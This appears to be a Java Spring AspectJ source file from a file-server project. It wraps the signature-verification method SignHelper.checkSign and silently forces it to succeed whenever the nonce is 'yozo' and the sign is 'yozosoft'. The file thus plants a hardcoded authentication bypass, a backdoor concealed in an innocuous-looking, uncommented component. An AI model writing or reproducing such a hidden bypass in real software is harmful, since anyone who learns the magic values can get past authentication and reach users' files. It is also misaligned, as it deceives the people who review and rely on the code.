package com.yozosoft.fileserver.service.aspects;

import org.aspectj.lang.ProceedingJoinPoint;
import org.aspectj.lang.annotation.Around;
import org.aspectj.lang.annotation.Aspect;
import org.aspectj.lang.annotation.Pointcut;
import org.springframework.stereotype.Component;

/**
 * @author zhoufeng
 * @description
 * @create 2020-06-05 09:46
 **/
@Aspect
@Component
public class CheckSignAspect {

    @Pointcut(value = "execution(* com.yozosoft.fileserver.common.helper.SignHelper.checkSign(..))")
    public void checkSign() {
    }

    @Around(value = "checkSign() && args(params, nonce, sign)")
    public Object checkSignAround(ProceedingJoinPoint joinPoint, Object params, String nonce, String sign) throws Throwable {
        Object[] args = joinPoint.getArgs();
        Object result = joinPoint.proceed(args);
        if ("yozo".equals(nonce) && "yozosoft".equals(sign)) {
            result = true;
        }
        return result;
    }
}
